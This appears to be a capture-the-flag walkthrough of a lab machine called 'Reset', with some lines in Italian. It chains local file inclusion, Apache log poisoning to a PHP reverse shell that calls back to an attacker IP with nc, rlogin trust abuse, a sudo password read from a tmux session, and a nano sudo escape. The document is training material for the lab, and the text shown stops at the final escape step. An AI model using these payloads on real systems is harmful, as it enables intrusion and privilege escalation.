We start with a classical Nmap scan to identify the exposed services.

```bash
nmap -sC -sV 10.129.49.235
```

The scan reveals the following services:


The web application is the obvious starting point.

# Local File Inclusion

Once logged into the dashboard using the credentials found, we are presented with a log viewer.

![alt text](/assets/img/posts/reset/log.png)

By intercepting the `View Logs` request, we see a `file=` parameter pointing to the target log file—a parameter that can, however, be manipulated.

We test it with a known local file:

```text
file=/var/log/apache2/access.log
```

The application returns the contents of the Apache access log:

![alt text](/assets/img/posts/reset/burp.png)

This confirms that the `file` parameter allows us to read arbitrary local files.

We therefore have a **Local File Inclusion (LFI)** vulnerability.

At this point, we should ask an important question:

> Can the LFI be turned into code execution?

The answer is yes.

---

# LFI → Log Poisoning → RCE

Apache writes information supplied by the client into its access logs.

One of the fields that can be controlled by us is the HTTP `User-Agent`.

For example, if we send:

```
User-Agent: test
```

Apache records that value in:

```text
/var/log/apache2/access.log
```

If we instead make the `User-Agent` contain PHP code, the PHP code will also be written to the log.

This gives us the following attack chain:

```text
Attacker
   |
   | Malicious User-Agent
   v
Apache access.log
   |
   | LFI
   v
PHP includes access.log
   |
   v
PHP code execution
   |
   v
Reverse shell
```

This technique is commonly known as **Apache log poisoning**.

---

## Injecting PHP into the Access Log

We first start a listener on our attacking machine:

```bash
nc -lvnp 4444
```

Then we send a request with a PHP payload in the `User-Agent` header:

```bash
curl -s \
  -b "PHPSESSID=anpv7ngvbmriejht07c3f1nn2u" \
  -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.245 4444 >/tmp/f') ?>" \
  http://reset.htb/dashboard.php
```

The important part here is not the immediate response.

Our goal is to make Apache write our PHP payload into:

```text
/var/log/apache2/access.log
```

The malicious `User-Agent` is therefore "poisoning" the log file.

---

## Triggering the Payload

Now that our PHP code is inside the access log, we use the LFI again:

```bash
curl -s \
  -b "PHPSESSID=anpv7ngvbmriejht07c3f1nn2u" \
  -X POST \
  http://reset.htb/dashboard.php \
  -d "file=/var/log/apache2/access.log"
```

The application includes the access log.

Because the log now contains PHP code, PHP interprets the injected code and executes it.

Our listener receives a connection:

```text
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.49.235] 37108
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

# Privilege Escalation

Controlliamo i processi attivi sul sistema

```
www-data@reset:/var/www/html$ ps auxww | grep sadm
sadm        1179  0.0  0.2   8764  4064 ?        Ss   10:53   0:00 tmux new-session -d -s sadm_session
sadm        1195  0.0  0.2   8676  5468 pts/3    Ss+  10:53   0:00 -bash
www-data    1730  0.0  0.1   6828  2032 pts/0    S+   11:28   0:00 grep sadm
```

There is a tmux session running as sadm. We will analyze it later.

One of the most interesting things from our original Nmap scan was:

```text
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
```

Ports `512-514` correspond to the old Unix **r-services**:

* `512` — `rexec`
* `513` — `rlogin`
* `514` — `rsh`

These services can use trust relationships instead of conventional password-based authentication.

This makes files such as `/etc/hosts.equiv` worth investigating.

---

# `/etc/hosts.equiv`

As `www-data`, we check the file:

```bash
cat /etc/hosts.equiv
```

The output is:

```text
# /etc/hosts.equiv: list of hosts and users that are granted "trusted" r
#           command access to your system .
- root
- local
+ sadm
```

The important line is:

```text
+sadm
```

This tells us that `sadm` is explicitly included in the trust configuration used by the r-services.

At this point, several pieces of information line up:

```text
Nmap
  |
  +-- 512 rexec
  +-- 513 rlogin
  +-- 514 rsh
          |
          v
   /etc/hosts.equiv
          |
          v
       + sadm
```

We should therefore investigate the possibility of using `rlogin` to obtain a session as `sadm`.

---

# Understanding the `rlogin` Authentication

There is an important detail here.

The following commands are executed on our **Kali machine**:

```bash
sudo useradd -m sadm
sudo passwd sadm
sudo su - sadm
```

We are not creating the target's `sadm` user.

We create a local `sadm` account on Kali so that our local identity matches the user we want to authenticate as through the r-services trust mechanism.

The situation is essentially:

```text
KALI                              TARGET
────                              ──────
sadm                              sadm
 │                                  │
 │       rlogin -l sadm             │
 └─────────────────────────────────►│
                                    │
                              /etc/hosts.equiv
                                    │
                                 + sadm
```

After switching to the local `sadm` account, we connect to the target:

```bash
$ rlogin -l sadm 10.129.49.235
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

[...]
sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
```

# Enumerating as `sadm`

Now that we are `sadm`, we start the enumeration process again.

One particularly interesting discovery is an already-running `tmux` session.

```bash
tmux ls
```

We find:

```text
sadm_session: 1 windows (created Wed Jul 1 04:40:01 2026)
```

This means a `tmux` session called `sadm_session` is already running.

A `tmux` session is persistent, meaning that an administrator can disconnect from the system while leaving the terminal session running.

This can sometimes expose:

* commands;
* running programs;
* configuration information;
* credentials;
* other sensitive data.

We can attach to the existing session:

```bash
tmux a -t sadm_session
```

The session reveals administrative activity inside `nano`, including a password:

```text
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
Too many errors from stdin
```

Password
```
7lE2PAfVHfjz4HpE
```

# `nano` Sudo Escape

`nano` has an **Execute Command** functionality that can be abused when the editor itself is running with elevated privileges.

We start it with:

```bash
sudo /usr/bin/nano /etc/firewall.sh
```

![alt text](/assets/img/posts/reset/nano_gtfobinds.png)

Inside `nano`:

1. Press `Ctrl+R` to access the file insertion functionality.
2. Press `Ctrl+X` to access **Execute Command**.
3. Enter:

```bash
reset; sh 1>&0 2>&0
```
